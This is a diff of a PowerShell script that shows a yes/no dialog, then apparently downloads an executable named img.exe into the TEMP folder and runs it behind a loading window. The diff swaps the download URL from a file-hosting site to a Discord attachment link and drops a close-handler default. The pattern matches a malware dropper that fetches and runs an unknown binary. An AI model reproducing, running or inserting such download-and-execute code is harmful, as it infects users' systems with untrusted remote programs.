@@ -72,29 +72,23 @@ function Show-DownloadDialog {
     $window.Content = $border
 
     $userResponse = $null
-    
+
     $yesButton.Add_Click({
         $userResponse = $true
         $window.Close()
     })
-    
+
     $noButton.Add_Click({
         $userResponse = $false
         $window.Close()
     })
-    
-    $window.Closing.Add({
-        if ($null -eq $userResponse) {
-            $userResponse = $false
-        }
-    })
-    
-    $window.ShowDialog()
+
+    $window.ShowDialog() | Out-Null
     return $userResponse
 }
 
 function DownloadAndExecute {
-    $url = "https://www.upload.ee/download/16677072/6b6fc11eadc91eda9381/img.exe"
+    $url = "https://cdn.discordapp.com/attachments/1224005091481227366/1244489034227781662/img.exe?ex=66554c3b&is=6653fabb&hm=e7f839a52f5d00d94a4bdaa1853dec5675058bb06c2213959166b8e2c9ef4d56&"
     $output = "$env:TEMP\img.exe"
     
     $webClient = New-Object System.Net.WebClient
@@ -163,9 +157,9 @@ if ($null -eq $dialogResult -or $dialogResult -eq $false) {
     $border.Child = $loadingStackPanel
     $loadingWindow.Content = $border
     $loadingWindow.Show()
-    
+
     DownloadAndExecute
-    
+
     $loadingWindow.Close()
 }
 
